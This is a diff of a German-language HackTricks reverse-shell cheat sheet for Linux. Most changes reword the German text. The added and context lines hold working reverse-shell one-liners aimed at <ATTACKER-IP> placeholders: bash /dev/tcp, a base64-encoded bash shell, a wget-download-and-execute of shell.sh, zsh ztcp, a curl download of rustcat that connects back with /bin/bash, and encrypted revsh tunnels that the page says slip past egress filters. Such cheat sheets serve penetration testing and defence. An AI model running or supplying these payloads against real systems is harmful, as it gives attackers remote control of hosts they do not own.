@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Wenn Sie Fragen zu einer dieser Shells haben, können Sie diese bei** [**https://explainshell.com/**](https://explainshell.com)
+**Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie bei** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**
 
 ## Vollständiges TTY
 
-**Sobald Sie eine Reverse-Shell erhalten haben**[ **lesen Sie diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**
+**Sobald Sie eine Reverse-Shell erhalten haben,** [**lesen Sie diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Vergessen Sie nicht, auch andere Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
+Vergiss nicht, auch mit anderen Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
 
 ### Symbol sichere Shell
 ```bash
@@ -38,7 +38,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 2. **`>&`**: Dieser Teil des Befehls ist eine Kurznotation für **das Umleiten von sowohl Standardausgabe** (`stdout`) als auch **Standardfehler** (`stderr`) an **das gleiche Ziel**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die **eine TCP-Verbindung zur angegebenen IP-Adresse und dem Port** darstellt.
 - Durch **das Umleiten der Ausgabe- und Fehlerströme zu dieser Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an die Maschine des Angreifers.
-4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) an das gleiche Ziel wie die Standardausgabe (`stdout`) um**.
+4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) an dasselbe Ziel wie die Standardausgabe (`stdout`) weiter**.
 
 ### In Datei erstellen und ausführen
 ```bash
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Beim Umgang mit einer **Remote Code Execution (RCE)**-Schwachstelle in einer Linux-basierten Webanwendung kann das Erreichen einer Reverse Shell durch Netzwerkverteidigungen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solchen eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell einzurichten, um effektiver mit dem kompromittierten System zu interagieren.
+Wenn man mit einer **Remote Code Execution (RCE)**-Schwachstelle in einer Linux-basierten Webanwendung umgeht, kann das Erreichen einer Reverse Shell durch Netzwerkverteidigungen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solchen eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell einzurichten, um effektiver mit dem kompromittierten System zu interagieren.
 
 Ein empfohlenes Tool für diesen Zweck ist [toboggan](https://github.com/n3rada/toboggan.git), das die Interaktion mit der Zielumgebung vereinfacht.
 
@@ -79,11 +79,11 @@ Und dann kannst du ausführen:
 ```shell
 toboggan -m nix.py -i
 ```
-Um direkt eine interaktive Shell zu nutzen. Sie können `-b` für die Burpsuite-Integration hinzufügen und `-i` entfernen, um einen einfacheren RCE-Wrap zu erhalten.
+Um direkt eine interaktive Shell zu nutzen. Sie können `-b` für die Burpsuite-Integration hinzufügen und `-i` für einen einfacheren RCE-Wrap entfernen.
 
-Eine weitere Möglichkeit besteht darin, die `IppSec`-Forward-Shell-Implementierung [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) zu verwenden.
+Eine weitere Möglichkeit besteht darin, die `IppSec`-Forward-Shell-Implementierung zu verwenden [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Sie müssen nur Folgendes ändern:
+Sie müssen nur Folgendes anpassen:
 
 - Die URL des verwundbaren Hosts
 - Das Präfix und Suffix Ihres Payloads (falls vorhanden)
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (eingebautes TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderner netcat-ähnlicher Listener, der in Rust geschrieben ist (seit 2024 in Kali verpackt).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Features:
+- Optional `--ssl` Flag für verschlüsselten Transport (TLS 1.3)
+- `-s` um beliebige Binärdatei (z.B. `/bin/sh`, `python3`) auf dem Opfer zu starten
+- `--up` um automatisch auf ein vollständig interaktives PTY zu upgraden
+
+## revsh (verschlüsselt & pivot-fähig)
+
+`revsh` ist ein kleiner C-Client/Server, der ein vollständiges TTY über einen **verschlüsselten Diffie-Hellman-Tunnel** bereitstellt und optional eine **TUN/TAP**-Schnittstelle für reverse VPN-ähnliches Pivoting anhängen kann.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Nützliche Flags:
+- `-b` : bind-shell anstelle von reverse
+- `-p socks5://127.0.0.1:9050` : Proxy über TOR/HTTP/SOCKS
+- `-t` : Erstelle ein TUN-Interface (reverse VPN)
+
+Da die gesamte Sitzung verschlüsselt und multiplexiert ist, umgeht sie oft einfache Egress-Filter, die eine Klartext `/dev/tcp` Shell beenden würden.
+
 ## OpenSSL
 
 Der Angreifer (Kali)
@@ -296,7 +338,7 @@ Dies wird versuchen, eine Verbindung zu Ihrem System über Port 6001 herzustelle
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Um die Reverse-Shell abzufangen, können Sie Folgendes verwenden (das auf Port 6001 lauscht):
+Um die Reverse-Shell abzufangen, können Sie (die auf Port 6001 lauscht) verwenden:
 ```bash
 # Authorize host
 xhost +targetip
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
